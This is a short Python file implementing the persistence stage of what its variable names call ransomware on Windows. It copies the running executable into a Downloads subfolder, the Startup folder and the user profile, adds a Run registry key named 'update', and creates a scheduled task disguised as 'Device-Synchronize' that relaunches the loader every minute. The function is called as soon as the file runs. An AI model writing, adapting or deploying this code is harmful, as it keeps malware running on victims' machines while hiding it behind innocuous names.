import subprocess as sp
import os 
import shutil
import sys

def persistence():
    
    ransomware_location = os.environ["USERPROFILE"] + "\\Downloads\\spr708a1\\loader.py"
    startup_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\loader.py"
    task_scheduler_location = os.environ['USERPROFILE'] + "\\loader.py"

    if not os.path.exists(ransomware_location) or not os.path.exists(startup_location) or not os.path.exists(task_scheduler_location):

        if not os.path.exists(ransomware_location):
            shutil.copyfile(sys.executable, ransomware_location)
            sp.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + ransomware_location + '" /f')

        if not os.path.exists(startup_location):# added
            shutil.copyfile(sys.executable, startup_location) # added

        if not os.path.exists(task_scheduler_location): # added
            shutil.copyfile(sys.executable, task_scheduler_location) # added
            output = os.popen(""" PowerShell /c Get-ScheduledTask "Device-Synchronize" """).read()
            if "Running" in output:
                pass
            else:
                sp.call(f'schtasks /create /sc MINUTE /mo 1 /tn "Device-Synchronize" /tr "cmd.exe /c {task_scheduler_location}"')
        
persistence()